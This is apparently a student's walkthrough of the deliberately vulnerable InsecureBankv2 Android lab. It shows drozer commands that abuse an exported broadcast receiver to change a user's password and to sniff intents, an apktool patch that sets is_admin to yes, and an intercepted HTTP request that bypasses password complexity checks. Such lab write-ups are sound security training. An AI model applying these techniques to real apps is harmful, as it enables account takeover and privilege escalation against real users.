# Insecure Bank v2

## Setup

```
git clone https://github.com/dineshshetty/Android-InsecureBankv2.git
cd AndroLabServer
pip install -r requirements.txt
python app.py
```

The server starts running on port 8888.

Install the app on your phone and connect to the same network as the server.

After opening the app on your phone, go to preferences and add your server's IP and port number.

Log in using the credentials given in the documentation.

-----

Checklist

- [x] Flawed Broadcast Receivers
- [x] Intent Sniffing and Injection
- [x] Weak Authorization mechanism
- [ ] Local Encryption issues
- [ ] Vulnerable Activity Components
- [ ] Root Detection and Bypass
- [ ] Emulator Detection and Bypass
- [ ] Insecure Content Provider access
- [ ] Insecure Webview implementation
- [ ] Weak Cryptography implementation
- [ ] Application Patching
- [ ] Sensitive Information in Memory
- [ ] Insecure Logging mechanism
- [ ] Android Pasteboard vulnerability
- [ ] Application Debuggable
- [ ] Android keyboard cache issues
- [ ] Android Backup vulnerability
- [ ] Runtime Manipulation
- [ ] Insecure SDCard storage
- [ ] Insecure HTTP connections
- [ ] Parameter Manipulation
- [ ] Hardcoded secrets
- [ ] Username Enumeration issue
- [ ] Developer Backdoors
- [x] Weak change password implementation

-----

## Flawed Broadcast Receivers

In AndroidManifest.xml, we have this code:

```
<receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
    <intent-filter>
        <action android:name="theBroadcast"/>
    </intent-filter>
</receiver>
```

You can learn more about it over [here](https://developer.android.com/guide/components/broadcasts) and [here](https://developer.android.com/guide/components/intents-filters).

Essentially, a broadcast receiver is a form of intent. Intents themselves are of two types: explicit and implicit. Explicit intents need the exact application name that is supposed to handle the action, whereas implicit intents can give you the option to choose between several apps that can handle the intent.

"By declaring an intent filter for an activity, you make it possible for other apps to directly start your activity with a certain kind of intent. Likewise, if you do not declare any intent filters for an activity, then it can be started only with an explicit intent."

We see that it uses the class MyBroadCastReceiver.java, so we'll go over the code in that file.

This class takes the phone number and new password from the previous activity.

```
String phn = intent.getStringExtra("phonenumber");
String newpass = intent.getStringExtra("newpass");
```

In order to understand why, where and how this broadcast is actually used, we search for "theBroadcast" and we find that it is used in ChangePassword.java as follows:

```
public void broadcastChangepasswordSMS(String phoneNumber, String pass) {

    if (TextUtils.isEmpty(phoneNumber.toString().trim())) {
        System.out.println("Phone number Invalid.");
        return;
    }

    Intent smsIntent = new Intent();
    smsIntent.setAction("theBroadcast");
    smsIntent.putExtra("phonenumber", phoneNumber);
    smsIntent.putExtra("newpass", pass);
    sendBroadcast(smsIntent);

}
```

So if we can create such an intent in another app, we can change the password of the user by calling the Context.sendBroadcast(Intent) as mentioned in the [BroadcastReceiver](https://developer.android.com/reference/android/content/Context#sendBroadcast(android.content.Intent)) documentation.

In order to save time, we can also use Drozer's `app.broadcast.send` to quickly send a broadcast without having to create an app.

```
dz> run app.broadcast.send --action theBroadcast --extra string phonenumber 1234 --extra string newpass asdf
```

Take a look at [this](https://hackerone.com/redirect?signature=e9b262c23bb3df8ec37850c763775bafb8b7acca&url=https%3A%2F%2Foldbam.github.io%2Fandroid%2Fsecurity%2Fandroid-vulnerabilities-insecurebank-broadcast-receivers) link.

Similar example can be found in [this](https://hackerone.com/reports/289000) report.

-----

## Intent Sniffing and Injection

Intent sniffing can be done when the application is sending broadcast intents.

We can use drozer module `app.broadcast.sniff` to sniff the required intent.

The action to be sniffed is `<action android:name="theBroadcast"/>`

Therefore the drozer command required will be: `dz> run app.broadcast.sniff --action theBroadcast`

But, after I run the change password functionality on my phone, drozer fails to register any broadcast intents. If anyone knows why this might be happening, do let me know.

I then proceeded to use the sniffer provided in the walkthrough `~/insecure_bankv2/wip-attackercode/SniffIntents`.

Once we install the app, we can call the intent using the above drozer code.

`Phone Number is: 1234 and New Password is: asdf`

-----

## Weak Authorization mechanism

Under `res/values/strings.xml` we find `is_admin`. Patch the app using apktool to change its value from `no` to `yes`.

-----

## Weak change password implementation

Client-side check requires password to be complex, but can be circumvented by intercepting and modifying request through a proxy.

```
POST /changepassword HTTP/1.1
Content-Length: 46
Content-Type: application/x-www-form-urlencoded
Host: 10.0.2.2:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=dinesh&newpassword=dinesh
```

-----

